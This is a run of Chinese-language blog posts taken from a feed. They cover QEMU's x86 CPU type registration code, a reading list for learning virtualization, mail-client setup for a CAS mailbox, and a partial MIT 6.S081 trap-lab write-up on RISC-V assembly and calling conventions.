model_id[48];</code>：这个字段包含了CPU的全名或模型标识符。它是一个字符串，用于提供更详细的CPU型号信息。</li></ol><p>builtin_x86_defs是一个非常大的数组，每一项表示一种模拟的CPU模型。QEMU既模拟了一些实际的CPU，比如pentium和SandyBridge，也模拟了一些虚拟机的CPU类型，比如qemu64和kvm64等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> X86CPUDefinition builtin_x86_defs[] = &#123;<br>    &#123;<br>        .name = <span class="hljs-string">&quot;qemu64&quot;</span>,<br>        .level = <span class="hljs-number">0xd</span>,<br>        .vendor = CPUID_VENDOR_AMD,<br>        .family = <span class="hljs-number">6</span>,<br>        .model = <span class="hljs-number">6</span>,<br>        .stepping = <span class="hljs-number">3</span>,<br>        .features[FEAT_1_EDX] =<br>            PPRO_FEATURES |<br>            CPUID_MTRR | CPUID_CLFLUSH | CPUID_MCA |<br>            CPUID_PSE36,<br>        .features[FEAT_1_ECX] =<br>            CPUID_EXT_SSE3 | CPUID_EXT_CX16,<br>        .features[FEAT_8000_0001_EDX] =<br>            CPUID_EXT2_LM | CPUID_EXT2_SYSCALL | CPUID_EXT2_NX,<br>        .features[FEAT_8000_0001_ECX] =<br>            CPUID_EXT3_LAHF_LM | CPUID_EXT3_SVM,<br>        .xlevel = <span class="hljs-number">0x8000000A</span>,<br>        .model_id = <span class="hljs-string">&quot;QEMU Virtual CPU version &quot;</span> QEMU_HW_VERSION,<br>    &#125;,<br><br>....<br><br><br></code></pre></td></tr></table></figure><p>x86_cpu_register_types 在 QEMU 中注册 x86 CPU 类型和模型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * TypeInfo:</span><br><span class="hljs-comment"> * @name: The name of the type.</span><br><span class="hljs-comment"> * @parent: The name of the parent type.</span><br><span class="hljs-comment"> * @instance_size: The size of the object (derivative of #Object).  If</span><br><span class="hljs-comment"> *   @instance_size is 0, then the size of the object will be the size of the</span><br><span class="hljs-comment"> *   parent object.</span><br><span class="hljs-comment"> * @instance_init: This function is called to initialize an object.  The parent</span><br><span class="hljs-comment"> *   class will have already been initialized so the type is only responsible</span><br><span class="hljs-comment"> *   for initializing its own members.</span><br><span class="hljs-comment"> * @instance_post_init: This function is called to finish initialization of</span><br><span class="hljs-comment"> *   an object, after all @instance_init functions were called.</span><br><span class="hljs-comment"> * @instance_finalize: This function is called during object destruction.  This</span><br><span class="hljs-comment"> *   is called before the parent @instance_finalize function has been called.</span><br><span class="hljs-comment"> *   An object should only free the members that are unique to its type in this</span><br><span class="hljs-comment"> *   function.</span><br><span class="hljs-comment"> * @abstract: If this field is true, then the class is considered abstract and</span><br><span class="hljs-comment"> *   cannot be directly instantiated.</span><br><span class="hljs-comment"> * @class_size: The size of the class object (derivative of #ObjectClass)</span><br><span class="hljs-comment"> *   for this object.  If @class_size is 0, then the size of the class will be</span><br><span class="hljs-comment"> *   assumed to be the size of the parent class.  This allows a type to avoid</span><br><span class="hljs-comment"> *   implementing an explicit class type if they are not adding additional</span><br><span class="hljs-comment"> *   virtual functions.</span><br><span class="hljs-comment"> * @class_init: This function is called after all parent class initialization</span><br><span class="hljs-comment"> *   has occurred to allow a class to set its default virtual method pointers.</span><br><span class="hljs-comment"> *   This is also the function to use to override virtual methods from a parent</span><br><span class="hljs-comment"> *   class.</span><br><span class="hljs-comment"> * @class_base_init: This function is called for all base classes after all</span><br><span class="hljs-comment"> *   parent class initialization has occurred, but before the class itself</span><br><span class="hljs-comment"> *   is initialized.  This is the function to use to undo the effects of</span><br><span class="hljs-comment"> *   memcpy from the parent class to the descendents.</span><br><span class="hljs-comment"> * @class_finalize: This function is called during class destruction and is</span><br><span class="hljs-comment"> *   meant to release and dynamic parameters allocated by @class_init.</span><br><span class="hljs-comment"> * @class_data: Data to pass to the @class_init, @class_base_init and</span><br><span class="hljs-comment"> *   @class_finalize functions.  This can be useful when building dynamic</span><br><span class="hljs-comment"> *   classes.</span><br><span class="hljs-comment"> * @interfaces: The list of interfaces associated with this type.  This</span><br><span class="hljs-comment"> *   should point to a static array that&#x27;s terminated with a zero filled</span><br><span class="hljs-comment"> *   element.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TypeInfo</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name;<br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *parent;<br><br>    <span class="hljs-keyword">size_t</span> instance_size;<br>    <span class="hljs-keyword">void</span> (*instance_init)(Object *obj);<br>    <span class="hljs-keyword">void</span> (*instance_post_init)(Object *obj);<br>    <span class="hljs-keyword">void</span> (*instance_finalize)(Object *obj);<br><br>    <span class="hljs-keyword">bool</span> abstract;<br>    <span class="hljs-keyword">size_t</span> class_size;<br><br>    <span class="hljs-keyword">void</span> (*class_init)(ObjectClass *klass, <span class="hljs-keyword">void</span> *data);<br>    <span class="hljs-keyword">void</span> (*class_base_init)(ObjectClass *klass, <span class="hljs-keyword">void</span> *data);<br>    <span class="hljs-keyword">void</span> (*class_finalize)(ObjectClass *klass, <span class="hljs-keyword">void</span> *data);<br>    <span class="hljs-keyword">void</span> *class_data;<br><br>    InterfaceInfo *interfaces;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">x86_cpu_register_types</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br><br>    type_register_static(&amp;x86_cpu_type_info);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ARRAY_SIZE(builtin_x86_defs); i++) &#123;<br>        x86_register_cpudef_type(&amp;builtin_x86_defs[i]);<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_KVM</span><br>    type_register_static(&amp;host_x86_cpu_type_info);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>&#125;<br><br><br></code></pre></td></tr></table></figure><ol><li><code>x86_cpu_type_info</code> 和 <code>host_x86_cpu_type_info</code>：这些变量是用于定义 x86 CPU 类型的 TypeInfo 结构。<code>x86_cpu_type_info</code> 是用于 QEMU 内部的虚拟 CPU 类型，而 <code>host_x86_cpu_type_info</code> 是用于与宿主机上的 CPU 特性保持一致的宿主 CPU 类型。</li><li><code>x86_register_cpudef_type</code>：这是一个函数，用于根据给定的 <code>X86CPUDefinition</code> 结构构建一个 <code>TypeInfo</code> 结构，并通过 <code>type_register</code> 函数将这个类型注册到 QEMU 类型系统中。它为每个不同的 CPU 模型创建一个类型，并提供必要的信息，例如 CPU 名称、特性、家族、型号等。</li><li><code>x86_cpu_register_types</code>：这个函数是用于注册 x86 CPU 类型和模型的主要函数。它首先注册了虚拟的 x86 CPU 类型 <code>x86_cpu_type_info</code>，然后通过遍历 <code>builtin_x86_defs</code> 数组中的 CPU 模型定义，为每个模型调用 <code>x86_register_cpudef_type</code> 函数，将其注册为 QEMU 类型。在这个过程中，也根据需要注册了宿主机的 CPU 类型 <code>host_x86_cpu_type_info</code>。</li></ol><p><img src="https://img.gls.show/img/20230821173738.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">X86CPU</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    CPUState parent_obj;<br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br><br>    CPUX86State env;<br><br>.....<br><br>&#125;<br></code></pre></td></tr></table></figure><p>一个X86CPU表示一个x86虚拟CPU</p><ol><li>CPUState包含所有CPU类型都会有的数据，如CPU的核数、线程数以及对应的线程，由于历史原因，也会有诸如TCG和KVM等模拟器相关的数据，如kvm_fd、kvm_state、kvm_run等KVM相关的数据。CPUState中有一个env_ptr指针，指向的是其CPU架构的CPU状态信息。</li><li><strong>env_ptr：</strong> 这是 CPUState 中的一个指针，指向特定 CPU 架构的 CPU 状态信息。它的作用是为了方便地从通用的 CPUState 结构中获取特定架构的具体 CPU 数据，使得不同架构的 CPU 可以在同一个通用结构中共存。例如，对于 x86 架构的 CPU，env_ptr 指向的就是 CPUX86State 结构。</li><li><strong>X86CPUState（env）：</strong> 这是 X86 架构特定的 CPU 数据结构。在 X86CPU 结构中，会包含一个指向 X86CPUState 的指针（env），这个指针指向了包含了重要的 x86 架构 CPU 数据的结构。CPUX86State 中包含了通用寄存器、EIP、EFLAGS、段寄存器等寄存器的值，还包含了 KVM 相关的异常、中断信息以及 CPUID 的信息。在模拟过程中，这些数据用于模拟 x86 架构 CPU 的状态和行为。</li></ol><h3 id="4-4-2-CPU对象的初始化"><a href="#4-4-2-CPU对象的初始化" class="headerlink" title="4.4.2 CPU对象的初始化"></a>4.4.2 CPU对象的初始化</h3><p>CPU类型的初始化基本都是设置一系列的回调函数，但类型TYPE_X86_CPU的初始化函数x86_cpu_common_class_init较为特殊</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">x86_cpu_common_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-keyword">void</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    X86CPUClass *xcc = X86_CPU_CLASS(oc);<br>    CPUClass *cc = CPU_CLASS(oc);<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br><br>    xcc-&gt;parent_realize = dc-&gt;realize;<br>    xcc-&gt;parent_unrealize = dc-&gt;unrealize;<br>    dc-&gt;realize = x86_cpu_realizefn;<br>    dc-&gt;unrealize = x86_cpu_unrealizefn;<br>    .....<br></code></pre></td></tr></table></figure><ol><li><code>x86_cpu_common_class_init</code> 函数：这是用于初始化 x86 CPU 类的共享属性和方法的函数。它通过参数 <code>oc</code>（ObjectClass 结构指针）和 <code>data</code>来进行初始化。在这个函数中，它首先获取了 x86 CPU 类和父类（CPU 类和设备类）的指针。</li><li><code>X86_CPU_CLASS(oc)</code>：这是一个宏，用于将 <code>oc</code> 转换为 <code>X86CPUClass</code> 类型的指针，以便可以访问 x86 CPU 类的属性和方法。</li><li><code>CPU_CLASS(oc)</code>：这是一个宏，用于将 <code>oc</code> 转换为 <code>CPUClass</code> 类型的指针，以便可以访问通用 CPU 类的属性和方法。</li><li><code>DEVICE_CLASS(oc)</code>：这是一个宏，用于将 <code>oc</code> 转换为 <code>DeviceClass</code> 类型的指针，以便可以访问设备类的属性和方法。</li><li><code>xcc-&gt;parent_realize = dc-&gt;realize;</code> 和 <code>xcc-&gt;parent_unrealize = dc-&gt;unrealize;</code>：<ol><li>这两行代码将设备类的 <code>realize</code> 和 <code>unrealize</code> 函数赋值给 x86 CPU 类中的 <code>parent_realize</code> 和 <code>parent_unrealize</code> 成员。</li><li>这是为了在 x86 CPU 类的具现化和销毁过程中，能够在执行特定的 <code>x86_cpu_realizefn</code> 和 <code>x86_cpu_unrealizefn</code> 函数之前，执行通用的设备类的具现化和销毁函数。</li></ol></li><li><code>dc-&gt;realize = x86_cpu_realizefn;</code> 和 <code>dc-&gt;unrealize = x86_cpu_unrealizefn;</code>：<ol><li>这两行代码将设备类的 <code>realize</code> 和 <code>unrealize</code> X86CPU<br>子对象的 <code>x86_cpu_realizefn</code> 和 <code>x86_cpu_unrealizefn</code> 函数。</li><li>这是为了确保在具现化和销毁过程中执行 x86 CPU 类的特定函数。</li></ol></li></ol><blockquote><p>这一块关于CPU类型在初始化时设置的<strong>具现函数</strong>，后面再仔细看看</p></blockquote><p>接下来详细分析CPU对象的创建过程</p><p>按照继承关系，首先调用TYPE_CPU的对象初始化函数cpu_common_initfn。这个函数是在所有CPU类型（比如x86、ARM等）共享的TYPE_CPU的初始化函数。它会在每个CPU对象创建时被调用，无论具体是什么类型的CPU。这个函数通常设置一些通用的初始值，用于在CPU对象创建时进行初始化。由于不同CPU类型可能有不同的特性和需求，这个函数通常只涉及通用的初始设置。</p><p><strong>x86_cpu_initfn函数：</strong> 这个函数是在具体的x86 CPU类型（TYPE_X86_CPU）的初始化函数。每次创建x86 CPU对象时都会调用这个函数，它的主要作用是为特定的x86架构CPU对象创建各种属性和数据。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>一个简短的虚拟化学习路线</title>
    <link href="/p/b3b5f6b7/"/>
    <url>/p/b3b5f6b7/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img.gls.show/img/20230810220435.png"></p><h1 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h1><ul><li>Hardware and Software Support for Virtualization</li><li>《深度探索Linux系统虚拟化》</li><li>《qemu kvm源码解析与应用》</li><li>《kvm实战》</li></ul><h1 id="Github仓库"><a href="#Github仓库" class="headerlink" title="Github仓库"></a>Github仓库</h1><ul><li><a href="https://github.com/petehouston/awesome-os-dev">GitHub - petehouston/awesome-os-dev: The collection of useful resources for OS development</a></li><li><a href="https://github.com/Metarget/awesome-cloud-native-security">GitHub - Metarget/awesome-cloud-native-security: awesome resources about cloud native security 🐿</a></li><li><a href="https://github.com/Wenzel/awesome-virtualization">GitHub - Wenzel/awesome-virtualization: Collection of resources about Virtualization</a></li><li><a href="https://github.com/yifengyou/learn-kvm">GitHub - yifengyou/learn-kvm: Qemu KVM(Kernel Virtual Machine)学习笔记</a></li><li><a href="https://github.com/0voice/Introduce_to_virtualization">GitHub - 0voice/Introduce_to_virtualization: 500篇关于虚拟化的经典资料，含CPU虚拟化，磁盘虚拟化，内存虚拟化，io虚拟化。</a></li></ul><h1 id="一些博文"><a href="#一些博文" class="headerlink" title="一些博文"></a>一些博文</h1><p><a href="https://wiki.osdev.org/Main_Page">Expanded Main Page - OSDev Wiki</a><br><a href="https://www.linux-kvm.org/page/KVM_Forum">KVM Forum - KVM</a><br><a href="https://people.cs.nctu.edu.tw/~chenwj/dokuwiki/doku.php?id=kvm">kvm - 韋任的維基百科</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用邮箱客户端配置中科院邮箱</title>
    <link href="/p/b8f95159/"/>
    <url>/p/b8f95159/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img.gls.show/img/20230803194818.png"></p><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>生活中我们经常碰到反复切换多个邮箱查看邮件的窘境，因此配置好邮箱客户端是十分重要的。配置完成邮箱客户端之后，只需要打开邮箱客户端，你就可以直观的管理多个邮箱，比如QQ邮箱、Gmail、163邮箱等</p><p>常见的邮箱客户端有下面几个：</p><ul><li>thunderbird。开源、免费、插件丰富，可惜在我的机器上永远都会出现卡死的bug</li><li>Outlook。微软开发，被包含在office中，兼容性好，功能丰富，可惜office收费并且经常跳弹窗</li><li><strong>Foxmail。简单、易用，它也是我目前的使用方案</strong></li><li><strong>苹果自带邮箱。简洁易用，有苹果多设备同步支持</strong></li></ul><h1 id="配置邮箱客户端"><a href="#配置邮箱客户端" class="headerlink" title="配置邮箱客户端"></a>配置邮箱客户端</h1><p>打开邮箱对应的账户页面，配置客户端专用密码（这个密码不同于你的登录密码），邮箱客户端使用的是这个专用密码</p><p><img src="https://img.gls.show/img/image-20230713120550237.png" alt="image-20230713120550237"></p><p>在Foxmail中新建账号，配置IMAP、SMTP服务器和其对应的端口</p><p>以中科院邮箱为例，配置如下：</p><p><img src="https://img.gls.show/img/image-20230713120608268.png" alt="image-20230713120608268"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MIT-6.S081：Lab4 trap</title>
    <link href="/p/69660c86/"/>
    <url>/p/69660c86/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img.gls.show/img/20230830215347.png"></p><h1 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h1><ul><li><p>看完<a href="https://www.bilibili.com/video/BV19k4y1C7kA">p4、p5</a></p></li><li><p>搞清楚<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/traps.html">lab要求</a></p></li><li><p>对riscv指令集、函数调用约定、trap机制有一定理解</p></li></ul><h1 id="RISC-V-assembly-easy"><a href="#RISC-V-assembly-easy" class="headerlink" title="RISC-V assembly (easy)"></a>RISC-V assembly (<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/guidance.html">easy</a>)</h1><p>通过make fs.img 命令可以将user/call.c文件转化为user/call.asm文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/param.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/types.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">g</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> x+<span class="hljs-number">3</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">f</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>  <span class="hljs-keyword">return</span> g(x);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d\n&quot;</span>, f(<span class="hljs-number">8</span>)+<span class="hljs-number">1</span>, <span class="hljs-number">13</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>不难观察出：</p><ol><li><code>s0</code>寄存器（也称为<code>fp</code>或帧指针）：它用于保存当前函数的帧指针，即指向当前函数栈帧的基址。在函数调用过程中，<code>s0</code>寄存器通常被用于存储上一个函数的栈帧基址，以便在函数返回时恢复调用者的栈帧。</li><li><code>sp</code>寄存器（也称为堆栈指针）：它用于指示当前的栈顶位置，即栈指针。栈是一种后进先出（LIFO）的数据结构，用于存储局部变量、函数调用信息和其他临时数据。在函数调用期间，栈会动态增长和收缩，而<code>sp</code>寄存器会随着栈的变化而移动。</li><li>a0保存第一个参数，同时具有存储返回值的用途（也即是x，返回x+3）。a1存储第二个参数，以此类推</li><li>f函数被内联优化，没有新开辟栈帧，它的内容和g函数相同</li><li>ra寄存器存储函数的返回地址</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs asm"><br>user/_call:     file format elf64-littleriscv<br><br><br>Disassembly of section .text:<br><br>0000000000000000 &lt;g&gt;:<br>#include &quot;kernel/param.h&quot;<br>#include &quot;kernel/types.h&quot;<br>#include &quot;kernel/stat.h&quot;<br>#include &quot;user/user.h&quot;<br><br>int g(int x) &#123;<br>   0:1141                addisp,sp,-16 #给栈指针分配内存<br>   2:e422                sds0,8(sp) #保存s0寄存器的值<br>   4:0800                addis0,sp,16 <br>  return x+3;<br>&#125;<br>   6:250d                addiwa0,a0,3 # a0是第一个参数，也即是x，返回x+3<br>   8:6422                lds0,8(sp)<br>   a:0141                addisp,sp,16<br>   c:8082                ret<br><br>000000000000000e &lt;f&gt;:<br>#f函数被内联优化，没有新开辟栈帧，它的内容和g函数相同<br>int f(int x) &#123;<br>   e:1141                addisp,sp,-16<br>  10:e422                sds0,8(sp)<br>  12:0800                addis0,sp,16<br>  return g(x);<br>&#125;<br>  14:250d                addiwa0,a0,3<br>  16:6422                lds0,8(sp)<br>  18:0141                addisp,sp,16<br>  1a:8082                ret<br><br>000000000000001c &lt;main&gt;:<br><br>void main(void) &#123;<br>  1c:1141                addisp,sp,-16 # 初始化工作<br>  1e:e406                sdra,8(sp)<br>  20:e022                sds0,0(sp)<br>  22:0800                addis0,sp,16<br>  printf(&quot;%d %d\n&quot;, f(8)+1, 13);<br>  24:4635                lia2,13<br>  26:45b1                lia1,12 # f(8)+1<br>  28:00000517          auipca0,0x0<br>  2c:79050513          addia0,a0,1936 # 7b8 &lt;malloc+0xea&gt;<br>  30:00000097          auipcra,0x0<br>  34:5e6080e7          jalr1510(ra) # 616 &lt;printf&gt;<br>  exit(0);<br>  38:4501                lia0,0<br>  3a:00000097          auipcra,0x0<br>  3e:274080e7          jalr628(ra) # 2ae &lt;exit&gt;<br><br></code></pre></td></tr></table></figure><h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><p>Which registers contain arguments to functions? For example, which register holds 13 in main’s call to <code>printf</code>?</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">reg    |<span class="hljs-string"> name  </span>|<span class="hljs-string"> saver  </span>|<span class="hljs-string"> description</span><br><span class="hljs-string">-------+-------+--------+------------</span><br><span class="hljs-string">x0     </span>|<span class="hljs-string"> zero  </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> hardwired zero</span><br><span class="hljs-string">x1     </span>|<span class="hljs-string"> ra    </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> return address</span><br><span class="hljs-string">x2     </span>|<span class="hljs-string"> sp    </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> stack pointer</span><br><span class="hljs-string">x3     </span>|<span class="hljs-string"> gp    </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> global pointer</span><br><span class="hljs-string">x4     </span>|<span class="hljs-string"> tp    </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> thread pointer</span><br><span class="hljs-string">x5-7   </span>|<span class="hljs-string"> t0-2  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> temporary registers</span><br><span class="hljs-string">x8     </span>|<span class="hljs-string"> s0/fp </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> saved register / frame pointer</span><br><span class="hljs-string">x9     </span>|<span class="hljs-string"> s1    </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> saved register</span><br><span class="hljs-string">x10-11 </span>|<span class="hljs-string"> a0-1  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> function arguments / return values</span><br><span class="hljs-string">x12-17 </span>|<span class="hljs-string"> a2-7  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> function arguments</span><br><span class="hljs-string">x18-27 </span>|<span class="hljs-string"> s2-11 </span>|<span class="hljs-string"> callee </span>|<span class="hljs-string"> saved registers</span><br><span class="hljs-string">x28-31 </span>|<span class="hljs-string"> t3-6  </span>|<span class="hljs-string"> caller </span>|<span class="hljs-string"> temporary registers</span><br><span class="hljs-string">pc     </span>|<span class="hljs-string">       </span>|<span class="hljs-string">        </span>|<span class="hljs-string"> program counter</span><br></code></pre></td></tr></table></figure><p>a0保存第一个参数，同时具有存储返回值的用途（也即是x，返回x+3）。a1存储第二个参数，以此类推</p><h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h2><p>Where is the call to function <code>f</code> in the assembly code for main? Where is the call to <code>g</code>? (Hint: the compiler may inline functions.)</p><p>代码<code>li    a1,12 </code>直接将f(8)+1的结果存入a1中，并没有调用函数的过程，这里存在编译器的优化</p><h2 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h2><p>At what address is the function <code>printf</code> located?</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">0000000000000616</span> &lt;printf&gt;:<br><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *fmt, ...)</span></span><br><span class="hljs-function"></span>&#123;<br> <span class="hljs-number">616</span>:<span class="hljs-number">711</span>d                addisp,sp,<span class="hljs-number">-96</span><br></code></pre></td></tr></table></figure><p>616</p><blockquote><p><code>jalr 1510(ra)</code>指令用于调用<code>printf</code>函数，其中偏移量1510是相对于全局地址0x0<strong>的偏移</strong>。（全局地址不确定）</p></blockquote><h2 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h2><p>Run the following code.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">unsigned</span> int i = <span class="hljs-number">0</span>x<span 